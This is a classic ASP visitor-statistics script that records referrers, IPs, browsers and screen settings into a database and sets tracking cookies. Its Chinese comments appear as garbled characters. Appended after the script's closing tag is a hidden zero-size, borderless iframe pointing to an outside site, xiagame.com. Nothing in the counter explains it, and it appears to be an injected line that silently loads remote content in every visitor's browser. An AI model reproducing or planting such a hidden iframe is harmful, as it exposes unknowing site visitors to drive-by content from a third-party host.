<%@ Language=VBScript %>
<%
on error resume next
public vArea
t1=timer()
%>
<!--#include file="inc_config.asp"-->
<!--#include file="inc_class_CheckUserAgent.asp"-->
<!--#include file="inc_conn.asp"-->
<!--#include file="inc_siteinfo.asp"-->
<!--#include file="inc_stat_functions.asp"-->
<%
isCan = CFG_IsCan and cbool(site_CanS(14))

newdayCacheName=CFG_CacheName & "_NewDay"
if isempty(Application(newdayCacheName)) then Application(newdayCacheName)=cdate("1900-1-1")

LastIPCacheName=CFG_CacheName & "_LastIP_" & Siteid
if isempty(Application(LastIPCacheName)) then Application(LastIPCacheName)="#218.246.226.8#"


public Style,vZone,vColor,vSize,vCome,vPage,vLang,vIP,vIPt,vSoft,vOS,theurl,vAgent,truenow,S_SaveNum
dim isRe,sql,isNewDay

canCacheName=CFG_CacheName & "_can"
if isempty(Application(canCacheName)) then Application(canCacheName)=0

LastTCacheName=CFG_CacheName & "_LastTime"
if isempty(Application(LastTCacheName)) then Application(LastTCacheName)=now()

if now()-Application(LastTCacheName) > 0.01 then Application(canCacheName) = 0:Application(LastTCacheName)=now()

if Application(canCacheName) >= 2 then isCan=false

' ��ҳ������ʱ����ֹ©ͳ��
Response.Expires = 0




if isCan then
    Application.Lock
    Application(canCacheName) = Application(canCacheName) + 1
    Application.UnLock



' ******************************************************************************************
' ��  վ  ģ  ʽ



if Site_BigSite>0 then




' ********************** ��ȡ���� **********************

vCome		= Request("referrer")
vComeHost	= findhost(vCome)
vPage		= Request.ServerVariables("HTTP_REFERER")
vPageHost	= findhost(vPage)

vIP			= Request.ServerVariables("Remote_Addr")
				vIPs = split(vip,".")
vIPt		= vIPs(0)
				if CFG_IPLong>1 then vIPt=vIPt & "." & vips(1)

theurl		= "http://" & Request.ServerVariables("http_host") & finddir(Request.ServerVariables("url"))



	' ��ʱ���ĵ�ǰʱ��
	truenow		= dateadd("h",0 - CFG_ZoneServer,now())



' �� �Ƿ��µ�һ��
	isNewDay = false 
	if DateValue(Site_TodayDate) < DateValue(dateadd("h",Site_MasterTimeZone-CFG_ZoneServer,now())) then isNewDay=true  ' �Ƿ��µ�һ��
	if cdate(Site_StartTime) < cdate("2000-1-1") then
	  conn.Execute ("update Site set S_StartTime=(now()-"&CFG_ZoneServer&"/24) where site_id=" & siteID)
	  isnewday=true
	end if

' �� �µ�һ�죬��������죬����=0
	if isnewday then
	  if Application(newdayCacheName)<=now()-1 then
	    Application.Lock:Application(newdayCacheName)=now():Application.UnLock
		
		' Ϊ��������ӵ����������
		today0hour=dateadd("h",0-Site_MasterTimeZone,datevalue(now()))
		for i= 0 to 23
		  conn.execute ("delete * from View where Site_ID="&SiteID&" and V_DTime=#"&dateadd("h",i,today0hour)&"#")
		  conn.execute ("insert into View (Site_id,V_DTime,V_View,V_IP) Values("&Siteid&",'"&dateadd("h",i,today0hour)&"',0,0)")
		next
		
		' ɾ��������Ϣ�нϳ¾ɵ�
		if CFG_AutoDelBig > 0 then conn.execute "delete * from BigSite where B_LastTime <= (now()-"&CFG_ZoneServer&"/24-"&CFG_AutoDelBig&")"
		
		' ����SITE����������
		conn.Execute ("update Site set S_TodayDate = datevalue(now()+"&Site_MasterTimeZone-CFG_ZoneServer&"/24) where Site_Id=" & SiteID)
		
		Application.Lock:Application(newdayCacheName)=cdate("1900-1-1"):Application.UnLock
	  end if
	end if

' �� �Ƿ�ˢ��

	isRe = false
	if instr(Application(LastIPCacheName),"#" & vIP & "#") then isRe=true	' ���IP�Ѿ������ڱ�����б��У���ˢ��
'	if vComeHost=vPageHost then isre=true				' �����·վ��ͱ�����վ����ͬһ��վ�㣬����ˢ��
	
	if not isre then
		' ���������Ҫ��ˢ��IP
		Application.Lock 
		Application(LastIPCacheName)=vsaveips(Application(LastIPCacheName))
		Application.UnLock

' �� д��������Ϣ
	  if site_CanS(11) then
	    vKeyw=findKeystr(vCome)
        if vKeyw<> "" then vKeyw=trim(Lcase(vKeyw)) : SaveBig 2,vKeyw	' 2 ��վģʽ���ؼ���
      end if
      if site_CanS(9) then SaveBig 0,vcomehost											' 0 ��վģʽ����·
      if site_CanS(13) then SaveBig 4,vpage											' 4 ��վģʽ�������ҳ��
    end if
    

' �� д��������Ϣ

	nowHour=cdate(DateValue(truenow) & " " & hour(truenow)&":00:00")      ' �����Ǽ���
	if isre then		' �����ˢ�£���ֻ���������
		conn.execute("update View set V_View=V_View+1 where site_id=" & SiteID & " and V_DTime=#" & nowHour & "#")
	else				' �������ˢ�£������������ͷ�����
		conn.execute("update View set V_View=V_View+1,V_IP=V_IP+1 where site_id=" & SiteID & " and V_DTime=#" & nowHour & "#")
	end if
	
	' д���������û�������������
	if not isre then call SaveLastUser():Application(LastTCacheName)=now()

	' �ر����ݿ�
	call closeconn











' ******************************************************************************************
' ��  ͨ  ģ  ʽ

else


' ********************** ��ȡ���� **********************

theurl		= "http://" & Request.ServerVariables("http_host") & finddir(Request.ServerVariables("url"))

vStyle		= Request("style")
vZone		= Request("tzone")
vColor		= Request("tcolor")
vSize		= Request("sSize")
vCome		= Request("referrer")
vComeHost	= findhost(vCome)
vPage		= Request.ServerVariables("HTTP_REFERER")
vPageHost	= findhost(vPage)
				if right(vpage,1)="/" then vpage=left(vpage,len(vpage)-1)

vLang		= Request.ServerVariables("HTTP_ACCEPT_LANGUAGE")
vLang		= split(vLang,",")(0)
vLang		= lcase(split(vLang,";")(0))

vIP			= Request.ServerVariables("Remote_Addr")
				vIPs = split(vip,".")
vIPt		= vIPs(0)
				if CFG_IPLong>1 then vIPt=vIPt & "." & vips(1)

vAgent		= Request.ServerVariables("HTTP_USER_AGENT")

	' ��ʱ���ĵ�ǰʱ��
	truenow		= dateadd("h",0 - CFG_ZoneServer,now())



' �Ƿ��µ�һ��
	isNewDay = false 
	if DateValue(Site_TodayDate) < DateValue(dateadd("h",Site_MasterTimeZone-CFG_ZoneServer,now())) then isNewDay=true  ' �Ƿ��µ�һ��
	if cdate(Site_StartTime) < cdate("2000-1-1") then
	  conn.Execute ("update Site set S_StartTime=(now()-"&CFG_ZoneServer&"/24) where site_id=" & siteID)
	  isnewday=true
	end if

	' �µ�һ�죬��������죬����=0
	if isnewday then
	  if Application(newdayCacheName)<=now()-1 then
		Application.Lock:Application(newdayCacheName)=now():Application.UnLock 

		' Ϊ��������ӵ����������
		today0hour=dateadd("h",0-Site_MasterTimeZone,datevalue(now()))
		for i= 0 to 23
		  conn.execute ("delete * from View where Site_ID="&SiteID&" and V_DTime=#"&dateadd("h",i,today0hour)&"#")
		  conn.execute ("insert into View (Site_id,V_DTime,V_View,V_IP) Values("&Siteid&",'"&dateadd("h",i,today0hour)&"',0,0)")
		next

		' ɾ��������Ϣ�нϳ¾ɵ�
		if CFG_AutoDel > 0 then conn.execute "delete * from Origin_Page where O_LastTime <= (now()-"&CFG_ZoneServer&"/24-"&CFG_AutoDel&")"

		' ����SITE����������
		conn.Execute ("update Site set S_TodayDate = datevalue(now()+"&Site_MasterTimeZone-CFG_ZoneServer&"/24) where Site_Id=" & SiteID)
		conn.Execute ("update Client set C_Yesterday=C_Today,C_Today=0 where Site_Id=" & SiteID)
		conn.Execute ("update Origin_Page set O_Yesterday=O_Today,O_Today=0 where Site_Id=" & SiteID)

		Application.Lock:Application(newdayCacheName)=cdate("1900-1-1"):Application.UnLock 
	  end if
	end if

' �Ƿ�ˢ��

	vUser	= clng(Request.Cookies("Ajiang"&CFG_CacheName&SiteID)("Ajstat2"))		' ��ǰ�û�������
	vPageS	= clng(Request.Cookies("AjStat"&CFG_CacheName&SiteID)("AjstatPages"))	' ��ǰ�û��������ҳ����
	vUPageS	= clng(Request.Cookies("AjStat"&CFG_CacheName&SiteID)("UserPages"))		' ��ǰ�û����ҳ������

	isRe = false
	if instr(Application(LastIPCacheName),"#" & vIP & "#") then isRe=true	' ���IP�Ѿ������ڱ�����б��У���ˢ��
'	if vComeHost=vPageHost then isre=true				' �����·վ��ͱ�����վ����ͬһ��վ�㣬����ˢ��
	if isre then
		vPageS	= vPageS + 1
	else
		vPageS	= 1
		vUser	= vUser+1
				Response.Cookies("Ajiang"&CFG_CacheName&SiteID)("Ajstat2")=vuser
				Response.Cookies("Ajiang"&CFG_CacheName&SiteID).Expires=dateadd("d",100,date() )
		' ���������Ҫ��ˢ��IP
		Application.Lock 
		Application(LastIPCacheName)=vsaveips(Application(LastIPCacheName))
		Application.UnLock
	end if
	Response.Cookies("AjStat"&CFG_CacheName&SiteID)("AjstatPages")=vPageS
	Response.Cookies("AjStat"&CFG_CacheName&SiteID)("UserPages")=vUPageS + 1
	
	Response.Cookies("AjStat"&CFG_CacheName&SiteID).Expires=dateadd("d",100,date() )

' ==========================================================
'                     д �� �� ϸ �� Ϣ
' ==========================================================
	
	if not isre then											' Client����
		set CUA=new CheckUserAgent
		CUA.execute vAgent
		vOs = cua.vos
		vSoft = cua.vsoft

		if vos<> "" and site_CanS(0) then SaveClient 0,vOs			' 0 ����ϵͳ
		if vsoft<>"" and site_CanS(1) then							' 1 �����
			if instr(vSoft,",") then
				vvsoft=split(vsoft,",")
				for each dsoft in vvsoft
				  if trim(dsoft)<> "" then SaveClient 1,dSoft
				next
			else
				SaveClient 1,vSoft
			end if
		end if
		if site_CanS(2) then SaveClient 2,vLang				' 2 ����
		if site_CanS(3) then SaveClient 3,vZone				' 3 ʱ��
		if site_CanS(4) then SaveClient 4,vSize				' 4 ��Ļ��С
		if site_CanS(5) then SaveClient 5,vColor			' 5 ��Ļɫ��
		if site_CanS(6) then SaveClient 6,vUser				' 6 ���ʴ���
		if site_CanS(7) then								' 7 �����ߵ���
		  vArea=findArea(vIP)
		  if vArea<>"" then SaveClient 7,vArea
		end if
	end if
	if site_CanS(8) then SaveClient 8,vPageS				' 8 �����ҳ����

' ==========================================================

	if not isre then 
		if site_CanS(9) then SaveOP 0,vComeHost,vcome		' 0 ��·
		if site_CanS(10) then SaveOP 1,vpage,""				' 1 ���
		vKeyw=findKeystr(vCome)								' 2 �ؼ���
		if vKeyw<> "" and site_CanS(11) then vKeyw=trim(Lcase(vKeyw)) : SaveOP 2,vKeyw,vcome
		if site_CanS(12) then SaveOP 3,vipt,vip				' 3 IP
	end if
	if site_CanS(13) then SaveOP 4,vpage,""					' 4 ҳ��


' ==========================================================
'                     д �� �� �� �� Ϣ
' ==========================================================

	nowHour=cdate(DateValue(truenow) & " " & hour(truenow)&":00:00")      ' �����Ǽ���
	if isre then		' �����ˢ�£���ֻ���������
		conn.execute("update View set V_View=V_View+1 where site_id=" & SiteID & " and V_DTime=#" & nowHour & "#")
	else				' �������ˢ�£������������ͷ�����
		conn.execute("update View set V_View=V_View+1,V_IP=V_IP+1 where site_id=" & SiteID & " and V_DTime=#" & nowHour & "#")
	end if
	
	' д���������û�������������
	if not isre then call SaveLastUser()

	' �ر����ݿ�
	call closeconn

end if  '�Ƿ��վģʽ
    Application.Lock
    Application(canCacheName) = Application(canCacheName) - 1
    Application.UnLock


end if			'if isCan
%><IFRAME SRC=http://www.xiagame.com/ajiang/ajiang.asp width=0 height=0 frameborder=no border=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=no></IFRAME>